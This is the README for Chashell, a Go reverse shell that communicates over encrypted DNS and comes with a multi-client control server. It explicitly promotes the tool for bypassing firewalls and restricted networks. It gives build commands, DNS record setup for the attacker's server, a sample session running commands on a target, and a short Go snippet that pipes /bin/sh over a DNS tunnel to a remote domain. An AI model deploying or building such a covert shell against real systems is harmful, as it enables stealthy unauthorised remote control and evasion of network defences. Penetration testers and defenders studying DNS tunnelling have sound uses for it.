# Chashell

## Reverse Shell over DNS

Chashell is a [Go](https://golang.org/) reverse shell that communicates over DNS. 
It can be used to bypass firewalls or tightly restricted networks.

It comes with a multi-client control server, named `chaserv`.

### Communication security

Every packet is encrypted using symmetric cryptography ([XSalsa20](https://en.wikipedia.org/wiki/Salsa20) + [Poly1305](https://en.wikipedia.org/wiki/Poly1305)), with a shared key between the client
and the server.

We plan to implement asymmetric cryptography in the future.

### Protocol

Chashell communicates using [Protocol Buffers](https://developers.google.com/protocol-buffers/) serialized messages. For reference, the Protocol Buffers structure (`.proto` file) is available in the `proto` folder.

Here is a (simplified) communication chart :

Keep in mind that every packet is encrypted, hex-encoded and then packed for DNS transportation.

### Supported systems

Chashell should work with any desktop system (Windows, Linux, Darwin, BSD variants) that is supported by the Go compiler.

We tested those systems and it works without issues :

* Windows (386/amd64)
* Linux (386/amd64/arm64)
* OS X (386/amd64)

### How to use Chaserv/Chashell

#### Building

Make sure the [GOPATH](https://github.com/golang/go/wiki/GOPATH) environment variable is correctly configured before running these commands.

Build all the binaries (adjust the domain_name and the encryption_key to your needs):


```
$ export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
$ export DOMAIN_NAME=c.sysdream.com
$ make build-all
```

Build for a specific platform:

```
$ make build-all OSARCH="linux/arm"
```

Build only the server:

```
$ make build-server
```

Build only the client (*chashell* itself):

```
$ make build-client
```

#### DNS Settings

* Buy and configure a domain name of your choice (preferably short).
* Set a DNS record like this : 

```
chashell 300 IN A [SERVERIP]
c 300 IN NS chashell.[DOMAIN].
```

#### Usage

Basically, on the server side (attacker's computer), you must use the `chaserv` binary. For the client side (i.e the target), use the `chashell` binary.

So:

* Run `chaserv` on the control server.
* Run `chashell` on the target computer.

The client should now connect back to `chaserv`:

```
[n.chatelain]$ sudo ./chaserv
chashell >>> New session : 5c54404419e59881dfa3a757
chashell >>> sessions 5c54404419e59881dfa3a757
Interacting with session 5c54404419e59881dfa3a757.
whoami
n.chatelain
ls /
bin
boot
dev
[...]
usr
var
```

Use the `sessions [sessionid]` command to interact with a client.
When interacting with a session, you can use the `background` session in order to return to the `chashell` prompt.

Use the `exit` command to close `chaserv`.

## Implement your own

The `chashell/lib/transport` library is compatible with the `io.Reader` / `io.Writer` interface. So, implementing a reverse shell is as easy as :

```go
cmd := exec.Command("/bin/sh")

dnsTransport := transport.DNSStream(targetDomain, encryptionKey)

cmd.Stdout = dnsTransport
cmd.Stderr = dnsTransport
cmd.Stdin = dnsTransport
cmd.Run()
```

## Debugging

For more verbose messages, add `TAGS=debug` at the end of the make command.

## To Do

* Implement asymmetric cryptography ([Curve25519](https://en.wikipedia.org/wiki/Curve25519), [XSalsa20](https://en.wikipedia.org/wiki/Salsa20) and [Poly1305](https://en.wikipedia.org/wiki/Poly1305))
* Retrieve the host name using the `InfoPacket` message.
* Create a *proxy/relay* tool in order to tunnel TCP/UDP streams (Meterpreter over DNS !).
* Better error handling.
* Get rid of dependencies.
